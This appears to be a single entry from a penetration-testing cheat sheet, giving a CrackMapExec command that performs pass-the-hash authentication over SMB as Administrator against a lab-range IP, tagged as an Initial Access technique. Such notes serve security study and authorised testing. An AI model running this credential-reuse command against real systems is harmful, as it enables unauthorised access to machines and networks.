# crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

OS: Linux
Description: Crackmapexec Pass the Hash
Security Domains: Initial Access (https://www.notion.so/Initial-Access-1444c8e5237680db9b3afd69d2c38487?pvs=21)
Target_Technology: smb (https://www.notion.so/smb-1434c8e5237680e7b5c3ffe1f7ead9e1?pvs=21)